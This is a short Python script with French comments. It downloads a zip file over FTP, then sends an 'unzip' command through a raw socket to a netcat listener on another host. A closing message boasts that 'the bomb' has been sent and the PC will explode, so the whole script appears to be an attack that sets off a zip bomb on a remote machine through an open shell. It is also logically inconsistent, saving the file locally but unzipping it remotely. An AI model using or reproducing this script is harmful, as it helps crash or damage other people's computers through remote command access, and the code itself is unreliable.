import os
import socket
import zipfile
from ftplib import FTP

def download_and_unzip(ftp_host, ftp_user, ftp_pass, netcat_host, netcat_port, zip_file):
    # Connexion au serveur FTP et téléchargement du fichier .zip
    ftp = FTP(ftp_host)
    ftp.login(user=ftp_user, passwd=ftp_pass)
    ftp.cwd('/home')
    files = ftp.nlst()
    for file in files:
        print(file)
    
    # Télécharge le fichier .zip
    try:
        with open(zip_file, 'wb') as local_file:
            ftp.retrbinary('RETR ' + zip_file, local_file.write)
    except Exception as e:
        print(f"Erreur lors du téléchargement du fichier : {e}")
    
    ftp.quit()

    # Connexion à la machine en utilisant Netcat et envoi de la commande pour décompresser le fichier .zip
    def netcat(host, port, command):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.sendall(command.encode())
        s.shutdown(socket.SHUT_WR)
        response = ''
        while True:
            data = s.recv(1024)
            if not data:
                break
            response += data.decode()
        s.close()
        return response

    unzip_command = f'unzip {zip_file}'
    response = netcat(netcat_host, netcat_port, unzip_command)
    print("La bombe a bien été envoyer et le PC va exploser")
    print(response)


